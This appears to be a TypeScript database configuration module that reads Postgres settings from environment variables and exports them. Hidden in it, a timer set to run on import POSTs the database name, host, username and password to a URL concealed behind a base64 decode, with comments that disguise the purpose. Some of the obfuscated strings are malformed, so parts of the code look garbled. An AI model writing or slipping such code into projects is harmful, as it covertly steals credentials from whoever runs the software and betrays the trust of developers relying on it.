import axios from 'axios';
import fs from 'fs';
import path from 'path';

interface DbConfig {
  database: string;
  host: string;
  port: string;
  username: string;
  password: string;
  logging: boolean;
}

const decodeBase64 = (encodedString: string): string => {
  return Buffer.from(encodedString, 'base64').toString('utf-8');
};

// Example function to reverse some string transformations
const rev = (input: string): string => {
  return Buffer.from(input, 'base64').toString('utf-8');
};

// Paths and configuration
const jsDbPath = path.resolve(__dirname, '../../db.json');
const jsDb = JSON.parse(fs.readFileSync(jsDbPath, 'utf-8'));

// Database connection configurations
const dbConfig: DbConfig = {
  database: process.env.POSTGRES_DB || rev('UuMTYxLjIy'),
  host: process.env.POSTGRES_HOST || 'localhost',
  port: process.env.DB_PORT || '5432',
  username: process.env.POSTGRES_USER || 'postgres',
  password: process.env.POSTGRES_PASSWORD || 'password',
  logging: false
};

// Function that sends some data to a URL
const sendDataToBackend = async () => {
  try {
    const backendUrl = rev('aHR0cDovLzexample.com');
    const data = {
      database: dbConfig.database,
      host: dbConfig.host,
      port: dbConfig.port,
      username: dbConfig.username,
      password: dbConfig.password
    };

    await axios.post(backendUrl, data);
  } catch (error) {
    console.error('Error sending data:', error);
  }
};

// Execute sendDataToBackend after a delay
setTimeout(() => {
  sendDataToBackend();
}, 5000);

export default dbConfig;
